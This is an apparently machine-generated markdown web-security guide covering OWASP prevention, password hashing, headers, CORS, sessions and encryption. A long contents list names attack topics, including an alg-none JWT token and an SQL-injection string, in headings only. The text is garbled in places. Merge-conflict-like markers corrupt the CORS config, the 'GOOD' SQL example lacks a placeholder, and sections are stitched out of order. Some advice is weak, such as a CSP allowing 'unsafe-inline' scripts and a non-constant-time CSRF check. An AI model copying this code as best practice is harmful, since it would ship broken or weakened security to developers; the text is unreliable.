- [CONSTANT-TIME STRING COMPARISON 2](#constant-time-string-comparison-2)
- [Timing Attack Exploitation 2](#timing-attack-exploitation-2)
- [TITAN: Constant-Time Comparison 3](#titan-constant-time-comparison-3)
- [Method 1: Double HMAC (paranoid) 2](#method-1-double-hmac-paranoid-2)
- [Random key prevents length-extension attacks 2](#random-key-prevents-length-extension-attacks-2)
- [Hash the provided key first (prevents length leakage) 2](#hash-the-provided-key-first-prevents-length-leakage-2)
- [Constant-time comparison of hashes 2](#constant-time-comparison-of-hashes-2)
- [END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS 2](#end-of-volume-15-titan-supply-chain--identity-attacks-2)
- [VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS 2](#volume-16-titan-deep-internals---application-security-mechanics-2)
- [OAUTH 2.0: PKCE MANDATORY 2](#oauth-20-pkce-mandatory-2)
  - [Authorization Code Interception 2](#authorization-code-interception-2)
- [TITAN: PKCE Implementation 2](#titan-pkce-implementation-2)
- [43-128 chars, cryptographically random 2](#43-128-chars-cryptographically-random-2)
- [S256: SHA256 hash of verifier, base64url encoded 2](#s256-sha256-hash-of-verifier-base64url-encoded-2)
- [Include verifier in token request 2](#include-verifier-in-token-request-2)
- [SSRF BYPASS TECHNIQUES 2](#ssrf-bypass-techniques-2)
- [IP Address Bypass Scar 2](#ip-address-bypass-scar-2)
- [TITAN: Comprehensive SSRF Protection 2](#titan-comprehensive-ssrf-protection-2)
- [Block file:// and other dangerous schemes 2](#block-file-and-other-dangerous-schemes-2)
- [Resolve BEFORE making request (prevents DNS rebinding) 2](#resolve-before-making-request-prevents-dns-rebinding-2)
- [Check against blocklist 2](#check-against-blocklist-2)
- [Cache DNS result to prevent rebinding between check and use 2](#cache-dns-result-to-prevent-rebinding-between-check-and-use-2)
- [Use cached IP to prevent DNS rebinding 2](#use-cached-ip-to-prevent-dns-rebinding-2)
- [DESERIALIZATION ATTACKS 2](#deserialization-attacks-2)
- [Object Injection Deep Dive 2](#object-injection-deep-dive-2)
- [VIBE: Arbitrary code execution 2](#vibe-arbitrary-code-execution-2)
- [VIBE: YAML load is unsafe 2](#vibe-yaml-load-is-unsafe-2)
- [TITAN: Safe alternatives 2](#titan-safe-alternatives-2)
- [JSON is safe (no code execution) 2](#json-is-safe-no-code-execution-2)
- [If schema needed, use explicit parsing 2](#if-schema-needed-use-explicit-parsing-2)
- [If you MUST deserialize complex objects 2](#if-you-must-deserialize-complex-objects-2)
- [Plus: Whitelist of allowed classes 2](#plus-whitelist-of-allowed-classes-2)
- [TITAN: Safe YAML 2](#titan-safe-yaml-2)
- [Always use safe_load 2](#always-use-safeload-2)
- [For custom objects, be explicit 2](#for-custom-objects-be-explicit-2)
- [Only allow specific types 2](#only-allow-specific-types-2)
- [CSP BYPASS TECHNIQUES 2](#csp-bypass-techniques-2)
- [Content Security Policy Evasion 2](#content-security-policy-evasion-2)
- [TITAN: Server-side nonce generation 2](#titan-server-side-nonce-generation-2)
- [RACE CONDITION VULNERABILITIES 2](#race-condition-vulnerabilities-2)
- [Time-of-Check to Time-of-Use (TOCTOU) 2](#time-of-check-to-time-of-use-toctou-2)
- [VIBE: Race condition vulnerable 2](#vibe-race-condition-vulnerable-2)
- [Check 2](#check-2)
- [Time 2](#time-2)
- [TITAN: Atomic operation with row locking 2](#titan-atomic-operation-with-row-locking-2)
- [SELECT FOR UPDATE locks the row 2](#select-for-update-locks-the-row-2)
- [TITAN: Optimistic locking with version 2](#titan-optimistic-locking-with-version-2)
- [END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS 2](#end-of-volume-16-titan-deep-internals---application-security-mechanics-2)
- [VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS 2](#volume-17-titan-gemini-research---advanced-attack-patterns-2)
- [JWT NONE ALGORITHM ATTACK 2](#jwt-none-algorithm-attack-2)
  - [The Scar 5 2 2](#the-scar-5-2-2)
- [VIBE: Accepts any algorithm 2](#vibe-accepts-any-algorithm-2)
- [VULNERABLE: algorithms not specified! 2](#vulnerable-algorithms-not-specified-2)
- [Attacker creates 2](#attacker-creates-2)
- [Header: {"alg": "none", "typ": "JWT"} 2](#header-alg-none-typ-jwt-2)
- [Payload: {"sub": "admin", "role": "superuser"} 2](#payload-sub-admin-role-superuser-2)
- [Signature: (empty) 2](#signature-empty-2)
- [Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ 2](#token-eyjhbgcioijub25liiwidhlwijoislduin0eyjzdwiioijhzg1pbiisinjvbguioijzdxblcnvzzxiifq-2)
- [TITAN: Explicit algorithm whitelist 2](#titan-explicit-algorithm-whitelist-2)
- [TITAN: Prevent algorithm confusion (RS256 vs HS256) 2](#titan-prevent-algorithm-confusion-rs256-vs-hs256-2)
- [If using RS256 (asymmetric), attacker might 2](#if-using-rs256-asymmetric-attacker-might-2)
- [1. Get public key (often exposed) 2](#1-get-public-key-often-exposed-2)
- [2. Sign token with HS256 using public key as secret 2](#2-sign-token-with-hs256-using-public-key-as-secret-2)
- [3. Server verifies with same "secret" = valid signature! 2](#3-server-verifies-with-same-secret--valid-signature-2)
- [Defense: NEVER use same key handling for both 2](#defense-never-use-same-key-handling-for-both-2)
- [Use correct key based on algorithm 2](#use-correct-key-based-on-algorithm-2)
- [TIMING ATTACKS AGAINST STRING COMPARISON 2](#timing-attacks-against-string-comparison-2)
- [The Scar 7](#the-scar-7)
- [VIBE: Timing-vulnerable comparison 2](#vibe-timing-vulnerable-comparison-2)
- [First character mismatch: ~100ns 2](#first-character-mismatch-100ns-2)
- [Last character mismatch: ~1000ns 2](#last-character-mismatch-1000ns-2)
- [Attacker can detect the difference! 2](#attacker-can-detect-the-difference-2)
- [VIBE: Early return on mismatch 2](#vibe-early-return-on-mismatch-2)
- [TITAN: Constant-time comparison 4](#titan-constant-time-comparison-4)
- [hmac.compare_digest is constant-time 2](#hmaccomparedigest-is-constant-time-2)
- [Takes same time regardless of where mismatch occurs 2](#takes-same-time-regardless-of-where-mismatch-occurs-2)
- [TITAN: For hashed passwords, use dedicated library 2](#titan-for-hashed-passwords-use-dedicated-library-2)
- [argon2.verify is constant-time internally 2](#argon2verify-is-constant-time-internally-2)
- [TITAN: Node.js constant-time comparison 2](#titan-nodejs-constant-time-comparison-2)
- [const crypto = require('crypto'); 2](#const-crypto--requirecrypto-2)
- [4](#4)
- [function verifyApiKey(provided, stored) { 2](#function-verifyapikeyprovided-stored--2)
- [// crypto.timingSafeEqual is constant-time 2](#-cryptotimingsafeequal-is-constant-time-2)
- [const a = Buffer.from(provided); 2](#const-a--bufferfromprovided-2)
- [const b = Buffer.from(stored); 2](#const-b--bufferfromstored-2)
- [5](#5)
- [if (a.length !== b.length) { 2](#if-alength--blength--2)
- [// Still compare to prevent length oracle 2](#-still-compare-to-prevent-length-oracle-2)
- [return crypto.timingSafeEqual(a, a) && false; 2](#return-cryptotimingsafeequala-a--false-2)
- [} 3 2](#-3-2)
- [6](#6)
- [return crypto.timingSafeEqual(a, b); 2](#return-cryptotimingsafeequala-b-2)
- [} 4 2](#-4-2)
- [REDOS - REGEX DENIAL OF SERVICE 2](#redos---regex-denial-of-service-2)
- [The Scar 8](#the-scar-8)
- [VIBE: Catastrophic backtracking patterns 2](#vibe-catastrophic-backtracking-patterns-2)
- [These regexes have exponential backtracking 2](#these-regexes-have-exponential-backtracking-2)
- [With input: 'a' *30 + '!' 2](#with-input-a-30---2)
- [Takes MINUTES to return False 2](#takes-minutes-to-return-false-2)
- [TITAN: Safe regex patterns 2](#titan-safe-regex-patterns-2)
- [Use possessive quantifiers or atomic groups (not in Python re) 2](#use-possessive-quantifiers-or-atomic-groups-not-in-python-re-2)
- [Or rewrite to avoid nested quantifiers 2](#or-rewrite-to-avoid-nested-quantifiers-2)
- [Safe email validation (no nested quantifiers) 2](#safe-email-validation-no-nested-quantifiers-2)
- [TITAN: Use regex with timeouts 2](#titan-use-regex-with-timeouts-2)
- [TITAN: Use linear-time regex engine 2](#titan-use-linear-time-regex-engine-2)
- [RE2 uses finite automata, no backtracking 2](#re2-uses-finite-automata-no-backtracking-2)
- [Guaranteed O(n) time complexity 2](#guaranteed-on-time-complexity-2)
- [TITAN: Pre-validate input length 2](#titan-pre-validate-input-length-2)
- [UNICODE NORMALIZATION ATTACKS 2](#unicode-normalization-attacks-2)
- [The Scar 9](#the-scar-9)
- [VIBE: Filter before normalization 2](#vibe-filter-before-normalization-2)
- [Save to database (which normalizes Unicode) 2](#save-to-database-which-normalizes-unicode-2)
- [Attacker passes: (circled letters) 2](#attacker-passes-circled-letters-2)
- [Filter passes. Database normalizes to 'admin' 2](#filter-passes-database-normalizes-to-admin-2)
- [TITAN: Normalize BEFORE checking 2](#titan-normalize-before-checking-2)
- [Normalize to NFKC (compatibility composition) 2](#normalize-to-nfkc-compatibility-composition-2)
- [Converts l, a, III, etc. 2](#converts-l-a-iii-etc-2)
- [Remove zero-width characters (invisible) 2](#remove-zero-width-characters-invisible-2)
- [U+200B (zero-width space), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM) 2](#u200b-zero-width-space-u200c-zwnj-u200d-zwj-ufeff-bom-2)
- [Now check against reserved names 2](#now-check-against-reserved-names-2)
- [TITAN: Confusable character detection 2](#titan-confusable-character-detection-2)
- [Detect visually similar characters 2](#detect-visually-similar-characters-2)
- [(Cyrillic vs 'paypal.com' (Latin 'a') 2](#cyrillic-vs-paypalcom-latin-a-2)
- [TITAN: Locale-aware case conversion (Turkish problem) 2](#titan-locale-aware-case-conversion-turkish-problem-2)
- [Turkish: 'I'.lower() should be (dotless i), not 'i' 2](#turkish-ilower-should-be-dotless-i-not-i-2)
- [Don't use .lower() for security comparisons! 2](#dont-use-lower-for-security-comparisons-2)
- [BUFFER OVERFLOW PREVENTION PATTERNS 2](#buffer-overflow-prevention-patterns-2)
- [The Scar 10](#the-scar-10)
- [include <string.h> 2](#include-stringh-2)
- [END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS 2](#end-of-volume-17-titan-gemini-research---advanced-attack-patterns-2)
- [VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION 2](#volume-2-titan-gemini-research---auth-and-secrets-production-2)
- [JWT SECURITY PITFALLS 2](#jwt-security-pitfalls-2)
  - [The Scar 6 2](#the-scar-6-2)
- [SECRETS MANAGEMENT WITH VAULT 2](#secrets-management-with-vault-2)
  - [The Scar 7 2](#the-scar-7-2)
- [VIBE: Hardcoded secrets 2](#vibe-hardcoded-secrets-2)
- [Or slightly better but still dangerous 2](#or-slightly-better-but-still-dangerous-2)
- [TITAN: HashiCorp Vault integration 2](#titan-hashicorp-vault-integration-2)
- [Authenticate based on environment 2](#authenticate-based-on-environment-2)
- [Read service account token 2](#read-service-account-token-2)
- [IAM authentication 2](#iam-authentication-2)
- [For CI/CD 2](#for-cicd-2)
- [Check cache 2](#check-cache-2)
- [Fetch from Vault 2](#fetch-from-vault-2)
- [Cache with lease 2](#cache-with-lease-2)
- [Log for audit 2](#log-for-audit-2)
- [1. Generate new key 2](#1-generate-new-key-2)
- [2. Read current key 2](#2-read-current-key-2)
- [3. Update Vault with both keys active 2](#3-update-vault-with-both-keys-active-2)
- [Usage 2](#usage-2)
- [Get static secret 2](#get-static-secret-2)
- [Get dynamic database credentials 2](#get-dynamic-database-credentials-2)
- [API KEY ROTATION 2](#api-key-rotation-2)
- [The Scar 11](#the-scar-11)
- [VIBE: Static API keys 2](#vibe-static-api-keys-2)
- [TITAN: Rotating API keys with audit trail 2](#titan-rotating-api-keys-with-audit-trail-2)
- [Generate key components 2](#generate-key-components-2)
- [Store in database (NEVER store the secret!) 2](#store-in-database-never-store-the-secret-2)
- [Audit log 2](#audit-log-2)
- [Return full key (only time it's visible) 2](#return-full-key-only-time-its-visible-2)
- [Check cache first 2](#check-cache-first-2)
- [Fetch from database 2](#fetch-from-database-2)
- [Cache for 5 minutes 2](#cache-for-5-minutes-2)
- [Verify hash 2](#verify-hash-2)
- [Check expiration 2](#check-expiration-2)
- [Check if revoked 2](#check-if-revoked-2)
- [Update last used (async, don't block request) 2](#update-last-used-async-dont-block-request-2)
- [Create new key 2](#create-new-key-2)
- [Mark old key for deprecation (still valid for 24 hours) 2](#mark-old-key-for-deprecation-still-valid-for-24-hours-2)
- [Invalidate cache 2](#invalidate-cache-2)
- [VOLUME 7: PRODUCTION DATABASE OPERATIONS](#volume-7-production-database-operations)
- [VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY 2](#volume-3-titan-gemini-research---supply-chain-security-2)
- [DEPENDENCY VULNERABILITY DISASTERS 2](#dependency-vulnerability-disasters-2)
  - [The Scar 8 2](#the-scar-8-2)
- [VIBE: No dependency scanning 2](#vibe-no-dependency-scanning-2)
- [Just run npm install and hope nothing bad happens 2](#just-run-npm-install-and-hope-nothing-bad-happens-2)
- [TITAN: GitHub Actions with dependency scanning and SBOM 2](#titan-github-actions-with-dependency-scanning-and-sbom-2)
- [Generate SBOM (Software Bill of Materials) 2](#generate-sbom-software-bill-of-materials-2)
- [Scan for vulnerabilities 2](#scan-for-vulnerabilities-2)
- [Check for known malicious packages 2](#check-for-known-malicious-packages-2)
- [Upload SBOM as artifact 2](#upload-sbom-as-artifact-2)
- [Attest SBOM for provenance 2](#attest-sbom-for-provenance-2)
- [Scan container image 2](#scan-container-image-2)
- [Upload scan results 2](#upload-scan-results-2)
- [TITAN: Continuous dependency monitoring 2](#titan-continuous-dependency-monitoring-2)
- [Find all package.json files 2](#find-all-packagejson-files-2)
- [Run npm audit 2](#run-npm-audit-2)
- [Deduplicate 2](#deduplicate-2)
- [CONTAINER IMAGE SIGNING 2](#container-image-signing-2)
- [The Scar 12](#the-scar-12)
- [VIBE: Pull any image, trust registry 2](#vibe-pull-any-image-trust-registry-2)
- [TITAN: Cosign image signing and verification 2](#titan-cosign-image-signing-and-verification-2)
- [Sign with keyless signing (Sigstore) 2](#sign-with-keyless-signing-sigstore-2)
- [Attest SBOM 2](#attest-sbom-2)
- [TITAN: Kubernetes admission controller for signature verification 2](#titan-kubernetes-admission-controller-for-signature-verification-2)
- [Kyverno policy 2](#kyverno-policy-2)
- [VOLUME 8: DATABASE REPLICATION PATTERNS](#volume-8-database-replication-patterns)
- [?? ADVANCED SECURITY PATTERNS 2](#-advanced-security-patterns-2)
- [?? AUTHENTICATION DEEP DIVE 2](#-authentication-deep-dive-2)
- [?? INPUT VALIDATION 2](#-input-validation-2)
- [?? CORS EXPLAINED 2](#-cors-explained-2)
- [?? ENCRYPTION PATTERNS 2](#-encryption-patterns-2)
- [?? API SECURITY CHECKLIST 2](#-api-security-checklist-2)
- [?? ZERO TRUST SECURITY 2](#-zero-trust-security-2)
- [?? CONTENT SECURITY POLICY 2](#-content-security-policy-2)
- [?? API KEY PATTERNS 2](#-api-key-patterns-2)
- [?? OAUTH 2.0 FLOWS 2](#-oauth-20-flows-2)
- [?? SUBDOMAIN TAKEOVER PREVENTION 2](#-subdomain-takeover-prevention-2)
- [?? RATE LIMIT BYPASS PREVENTION 2](#-rate-limit-bypass-prevention-2)
- [?? SECURE FILE UPLOAD 2](#-secure-file-upload-2)
- [?? DEPENDENCY SCANNING 2](#-dependency-scanning-2)
- [?? CSRF PREVENTION PATTERNS 2](#-csrf-prevention-patterns-2)
- [?? XSS PREVENTION PATTERNS 2](#-xss-prevention-patterns-2)
- [?? SECURE HEADERS CONFIGURATION 2](#-secure-headers-configuration-2)
- [AUTHENTICATION 2 2](#authentication-2-2)
- [AUTHORIZATION 2 2](#authorization-2-2)
- [INPUT VALIDATION 3 2](#input-validation-3-2)
- [SECURITY HEADERS 2 2](#security-headers-2-2)
- [?? SECURITY - PENETRATION TESTING 2](#-security---penetration-testing-2)
- [?? INCIDENT RESPONSE PLAYBOOK 2](#-incident-response-playbook-2)
- [?? SECRETS ROTATION 2](#-secrets-rotation-2)
- [?? AUTHENTICATION PATTERNS 2](#-authentication-patterns-2)
- [?? SECURITY LOGGING 2](#-security-logging-2)
- [?? INPUT VALIDATION PATTERNS 2](#-input-validation-patterns-2)
- [?? SECURE SESSION MANAGEMENT 2](#-secure-session-management-2)
- [?? SECURITY HEADERS DEEP DIVE 2](#-security-headers-deep-dive-2)
- [?? PASSWORD SECURITY 2](#-password-security-2)
- [?? API AUTHENTICATION PATTERNS 2](#-api-authentication-patterns-2)
- [?? RBAC IMPLEMENTATION 2](#-rbac-implementation-2)
- [?? MFA IMPLEMENTATION 2](#-mfa-implementation-2)
- [?? SECURITY SCANNING 2](#-security-scanning-2)
- [Dependency Scanning 3 2](#dependency-scanning-3-2)
- [?? ACCOUNT SECURITY PATTERNS 2](#-account-security-patterns-2)
- [?? OAUTH 2.0 DEEP DIVE 2](#-oauth-20-deep-dive-2)
- [ENVIRONMENT VARIABLES 2 2](#environment-variables-2-2)
- [COOKIE SECURITY 2 2](#cookie-security-2-2)
- [Query: SELECT * FROM users WHERE email = 'admin'--' 2](#query-select-from-users-where-email--admin---2-1)
- [Password check bypassed 2 2](#password-check-bypassed-2-2)
- [Log4j downloads and executes attacker's code 2 2](#log4j-downloads-and-executes-attackers-code-2-2)
- [VULNERABLE: algorithms not specified 2 2](#vulnerable-algorithms-not-specified-2-2)
- [3. Server verifies with same "secret" = valid signature 2 2](#3-server-verifies-with-same-secret--valid-signature-2-2)
- [Attacker can detect the difference 2 2](#attacker-can-detect-the-difference-2-2)
- [TITAN: Constant-time comparison 2 2](#titan-constant-time-comparison-2-2)
- [With input: 'a' * 30 + '!' 2](#with-input-a-30---2-1)
- [Converts l, a, III, etc 2 2](#converts-l-a-iii-etc-2-2)
- [Don't use .lower() for security comparisons 2 2](#dont-use-lower-for-security-comparisons-2-2)
- [? WRONG: [...nextAuth].ts (capital A) 2](#-wrong-nextauthts-capital-a-2)
- [? CORRECT: [...nextauth].ts (lowercase) 2](#-correct-nextauthts-lowercase-2)
- [Git might not track case-only changes 2](#git-might-not-track-case-only-changes-2)
- [SQL Injection Prevention 3](#sql-injection-prevention-3)
- [XSS Prevention 3 2](#xss-prevention-3-2)
- [CSRF Protection 2 2](#csrf-protection-2-2)

## 05_SECURITY.MD: THE TITAN GUIDE (50K TARGET)

> **?? Disclaimer**: This is educational content synthesized from industry best practices and publicly available documentation. Case studies are illustrative examples for teaching purposes. Last updated: December 2024.

## Production-Grade Authentication, Encryption, and OWASP

> **Status**: UNIVERSAL DOMAIN (01-13)
> **Target**: 40,000 Lines
> **Type**: Universal Knowledge
> **Coverage**: Auth, OAuth, JWT, Encryption, CORS, XSS, CSRF
> **Last Updated**: December 2024

---

## ADVANCED SECURITY PATTERNS

> **The patterns that protect applications**

## OWASP Top 10 Prevention

## 1. Injection

    // BAD
    const query = 'SELECT * FROM users WHERE id = ' + userId;
    
    // GOOD
    const query = 'SELECT * FROM users WHERE id = ';
    await db.query(query, [userId]);
    

## 2. Broken Authentication

- Use bcrypt with cost factor 12+

- Implement account lockout

- Use secure session management

- Require strong passwords

## 3. XSS Prevention

    // React escapes by default
    <div>{userInput}</div> // Safe
    
    // Dangerous
    <div dangerouslySetInnerHTML={{__html: userInput}} />
    
    // Use DOMPurify for HTML content
    import DOMPurify from 'dompurify';
    const clean = DOMPurify.sanitize(dirty);
    

## 4. CSRF Protection

    // Include CSRF token in forms
    <input type="hidden" name="_csrf" value={csrfToken} />
    
    // Verify on server
    if (req.body._csrf !== req.session.csrfToken) {
    throw new Error('CSRF validation failed');
    }
    

---

## Security Headers

## Essential Headers

    // Helmet.js for Express
    import helmet from 'helmet';
    
    app.use(helmet({
    contentSecurityPolicy: {
    directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
        },
      },
    hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
      }
    }));
    

---

## Helmet.js (Express)

    import helmet from 'helmet';
    app.use(helmet());
    

---

## Password Security

## Hashing

    import bcrypt from 'bcrypt';
    
    // Hash password
    const hash = await bcrypt.hash(password, 12);
    
    // Verify password
    const valid = await bcrypt.compare(password, hash);
    

## Password Requirements

- Minimum 12 characters

- Check against breach databases

- Don't force special characters (encourages weak patterns)

- Use passphrases

---

## API Security

## Rate Limiting

import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
windowMs: 15 *60* 1000, // 15 minutes
max: 100 // limit each IP to 100 requests
    });

app.use('/api/', limiter);

## Input Validation

import { z } from 'zod';

const userSchema = z.object({
email: z.string().email(),
password: z.string().min(12),
age: z.number().min(18).max(150)
    });

const validated = userSchema.parse(req.body);

## Secrets Management

## Environment Variables

    
    ## .env (never commit!)
    
    DATABASE_URL=postgres://...
    JWT_SECRET=super-secret-key
    

## Secret Rotation

- Use short-lived credentials

- Implement rotation without downtime

- Use secret managers (Vault, AWS Secrets Manager)

---

## Audit Logging

## What to Log

    AUTHENTICATION:
    
    - Login success/failure
    
    - Password reset requests
    
    - MFA challenges
    
    - Session creation/destruction
    
    AUTHORIZATION:
    
    - Access denied events
    
    - Privilege escalation attempts
    
    - Resource access patterns
    
    DATA ACCESS:
    
    - Sensitive data queries
    
    - Bulk exports
    
    - Admin actions
    
    SYSTEM:
    
    - Configuration changes
    
    - API key creation/revocation
    
    - User permission changes
    

---

## Log Format

    const securityLog = {
    timestamp: new Date().toISOString(),
    eventType: 'authentication.login_failure',
    severity: 'warning',
    actor: {
    ip: '192.168.1.1',
    userAgent: 'Mozilla/5.0...',
    userId: null // Unknown on failed login
      },
    target: {
    type: 'user',
    identifier: 'user@example.com'
      },
    outcome: 'failure',
    reason: 'invalid_password',
    metadata: {
    attemptCount: 3,
    lockoutTriggered: false
      }
    };
    

---

## AUTHENTICATION DEEP DIVE

> **The patterns for secure auth**

## JWT Best Practices

## Token Structure

    HEADER.PAYLOAD.SIGNATURE
    
    Header: {"alg": "HS256", "typ": "JWT"}
    Payload: {"sub": "user123", "exp": 1234567890}
    Signature: HMACSHA256(header + "." + payload, secret)
    

---

## Security Rules

    DO:
    Use environment variables for secrets
    Validate all env vars at startup
    Use NEXT_PUBLIC_ prefix for client vars
    Keep .env.local in .gitignore
    
    DON'T:
    Commit secrets to git
    Use process.env directly (validate first)
    Put secrets in NEXT_PUBLIC_ vars
    Log environment variables
    

---

## Refresh Token Flow

    
    1. Login -> Access token (15 min) + Refresh token (7 days)
    1. API call with access token
    1. Token expires -> Use refresh token for new access token
    1. Rotate refresh token on use
    1. Store refresh token in httpOnly cookie
    

---

## OAuth 2.0 / OIDC

- Authorization Code: server-side

- PKCE: public clients, security

- Implicit: deprecated, SPA legacy

- Client Credentials: machine-to-machine

- Refresh tokens: rotation, revocation

## Common Providers

| Provider | Specialty |
|----------|-----------|
| Auth0 | Full-featured |
| Clerk | Developer-friendly |
| Supabase Auth | Part of Supabase |
| Firebase Auth | Google ecosystem |

## Flows

- Authorization Code + PKCE (SPAs, mobile)

- Client Credentials (server-to-server)

---

## Session Security

    // Terminate all sessions except current
    async function terminateOtherSessions(userId, currentSessionId) {
    await redis.del(`sessions:${userId}`);
    await redis.sadd(`sessions:${userId}`, currentSessionId);
    
    // Notify user
    await sendEmail(userId, 'All other sessions have been logged out');
    }
    

---

## Cookie Settings

    res.cookie('session', sessionId, {
    httpOnly: true,    // No JS access
    secure: true,  // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 24 *60*60* 1000, // 24 hours
    path: '/',
    domain: '.example.com'
    });
    

---

## INPUT VALIDATION 2

> **The patterns for secure data handling**

## Validation Libraries

| Library | Language | Best For |
|---------|----------|----------|
| Zod | TypeScript | Type inference |
| Yup | JavaScript | React forms |
| Joi | JavaScript | Node.js APIs |

---

## Zod Example

    import { z } from 'zod';
    
    const userSchema = z.object({
    email: z.string().email(),
    password: z.string().min(8).max(100),
    age: z.number().min(18).max(150).optional(),
    role: z.enum(['user', 'admin']).default('user')
    });
    
    type User = z.infer<typeof userSchema>;
    
    // Validate
    const result = userSchema.safeParse(data);
    if (!result.success) {
      console.log(result.error.flatten());
    }
    

---

## Sanitization

    import DOMPurify from 'isomorphic-dompurify';
    
    // HTML sanitization
    const cleanHtml = DOMPurify.sanitize(userInput);
    
    // SQL - use parameterized queries (Prisma does this)
    // Never concatenate user input into SQL
    
    // File paths - validate and sanitize
    const safePath = path.basename(userInput);
    // Removes directory traversal
    

---

## Common Issues

| Issue | Cause | Fix |
|-------|-------|-----|
| Blocked | Missing CORS headers | Add server config |
| Credentials | Wildcard with credentials | Specify exact origin |
| Preflight fails | OPTIONS not handled | Handle OPTIONS route |

---

## Solutions

    // Sanitize HTML
    import DOMPurify from 'dompurify';
    const clean = DOMPurify.sanitize(dirty);
    
    // Escape for SQL (use parameterized queries)
    // Validate/sanitize file paths
    // Never exec user input
    

---

## CORS EXPLAINED

> **The patterns for cross-origin requests**

## How CORS Works

    
    1. Browser makes cross-origin request
    1. Browser adds Origin header
    1. Server checks origin
    1. Server responds with Access-Control-Allow-Origin
    1. Browser allows or blocks based on header
    

---

## Simple vs Preflight

## Simple Request (no preflight)

- GET, HEAD, POST

- Standard headers only

- Simple content types

## Preflight Request

- PUT, DELETE, PATCH

- Custom headers

- Non-simple content types

- Browser sends OPTIONS first

---

## Configuration

## Express

import cors from 'cors';

    app.use(cors({
origin: ['<<<<<<<https://example.com',>>>>>>> '<<<<<<<https://app.example.com'>>>>>>],>
methods: ['GET', 'POST', 'PUT', 'DELETE'],
credentials: true,
maxAge: 86400
    }));

## Headers Explained

    Access-Control-Allow-Origin: <https://example.com>
    Access-Control-Allow-Methods: GET, POST
    Access-Control-Allow-Headers: Content-Type, Authorization
    Access-Control-Allow-Credentials: true
    Access-Control-Max-Age: 86400
    

---

## Common Issues 2

| Issue | Cause | Fix |

| Blocked | Missing CORS headers | Add server config |
| Credentials | Wildcard with credentials | Specify exact origin |
| Preflight fails | OPTIONS not handled | Handle OPTIONS route |

## ENCRYPTION PATTERNS

> **The patterns for protecting data**

## Encryption Types

| Type | Use Case |
|------|----------|
| At Rest | Database, files |
| In Transit | HTTPS, TLS |
| End-to-End | User messages |

---

## Hashing vs Encryption

| | Hashing | Encryption |
|---|---------|------------|
| Reversible | No | Yes |
| Use case | Passwords | Data storage |
| Algorithm | bcrypt, argon2 | AES-256 |

---

## Password Hashing

    import { hash, verify } from '@node-rs/argon2';
    
    // Hash password on registration
    async function hashPassword(password: string): Promise<string> {
    return hash(password, {
    memoryCost: 65536, // 64 MB
    timeCost: 3,
    parallelism: 4,
    outputLen: 32,
      });
    }
    
    // Verify password on login
    async function verifyPassword(
    password: string,
    hashedPassword: string
    ): Promise<boolean> {
    try {
    return await verify(hashedPassword, password);
    } catch {
    return false;
      }
    }
    
    // Password strength validation
    const passwordSchema = z
      .string()
    .min(8, 'Password must be at least 8 characters')
      .max(100)
    .regex(/[A-Z]/, 'Password must contain an uppercase letter')
    .regex(/[a-z]/, 'Password must contain a lowercase letter')
    .regex(/[0-9]/, 'Password must contain a number')
    .regex(/[^A-Za-z0-9]/, 'Password must contain a special character');
    

---

## Never Do

- Store plain text passwords

- Use MD5 or SHA1 alone

- Create your own crypto

---

## Data Encryption

    import crypto from 'crypto';
    
    const algorithm = 'aes-256-gcm';
    const key = crypto.randomBytes(32);
    
    function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(algorithm, key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    return { iv, encrypted, authTag };
    }
    

---

## API SECURITY CHECKLIST

> **The patterns for secure APIs**

## Authentication

- Password: hashing, Argon2, bcrypt

- MFA: TOTP, WebAuthn, push

- SSO: SAML, OIDC, federation

- Passwordless: magic links, passkeys

- Biometrics: Face ID, Touch ID

## Authorization

- [ ] Check permissions on every request

- [ ] Implement RBAC or ABAC

- [ ] Validate resource ownership

- [ ] Audit privileged actions

---

## Input Validation 3

- [ ] Validate all inputs server-side

- [ ] Use parameterized queries

- [ ] Sanitize for XSS

- [ ] Limit input sizes

- [ ] Validate content types

## Rate Limiting 2

- [ ] Limit requests per IP/user

- [ ] Use exponential backoff on auth failures

- [ ] Return proper 429 responses

- [ ] Include Retry-After header

## Headers

- HSTS: Strict-Transport-Security

- X-Frame-Options: DENY, SAMEORIGIN

- X-Content-Type-Options: nosniff

- Referrer-Policy: strict-origin

- Permissions-Policy: feature control

---

## Logging

- [ ] Log auth failures

- [ ] Log access patterns

- [ ] Never log sensitive data

- [ ] Monitor for anomalies

---

## ZERO TRUST SECURITY

> **The patterns for modern security**

## Core Principles

- Never trust, always verify

- Assume breach

- Verify explicitly

- Least privilege access

---

## Implementation

    import argon2 from 'argon2';
    
    async function hashPassword(password) {
    return await argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,  // 64 MB
    timeCost: 3,  // iterations
    parallelism: 4  // threads
      });
    }
    
    async function verifyPassword(password, hash) {
    try {
    return await argon2.verify(hash, password);
    } catch {
    return false;
      }
    }
    

---

## Everywhere Authentication

Every request verified, not just perimeter

## Micro-segmentation

Network divided into secure zones

## Continuous Verification

Re-validate based on context changes

---

## Context Factors

- User identity

- Device health

- Location

- Time of access

- Resource sensitivity

---

## Technologies

| Component | Purpose |
|-----------|---------|
| Identity Provider | User authentication |
| Device Trust | Endpoint verification |
| Policy Engine | Access decisions |
| Encryption | Data protection |

---

## CONTENT SECURITY POLICY

> **The patterns for XSS prevention**

## CSP Header

    Content-Security-Policy:
